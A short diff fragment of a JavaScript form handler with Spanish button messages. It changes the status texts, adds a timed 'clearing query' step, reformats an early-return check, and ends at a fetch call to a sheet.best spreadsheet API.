@@ -39,19 +39,22 @@ form.addEventListener("submit", e => {
 			if (cont == 0) {
 				btn.value = "Verificando..."
 				setTimeout(() => {
-					btn.value = "¡Frase correcta!"
+					btn.value = "Enhorabuena,no hay coincidencias"
 					setTimeout(() => {
-						btn.value = "Verificar"
-						input.value = ""
+						btn.value = "Borrando consulta..."
+						setTimeout(() => {
+							btn.value = "Verificar"
+														input.value = ""
+						}, 2500)
 					}, 2500)
 				}, 4000)
 			}
 		}
 	})
 
-if(cont > 0){
-	return false
-}
+	if (cont > 0) {
+		return false
+	}
 
 
 	fetch("https://sheet.best/api/sheets/f89d6959-4b0d-479e-9bcd-3d5222020639", {
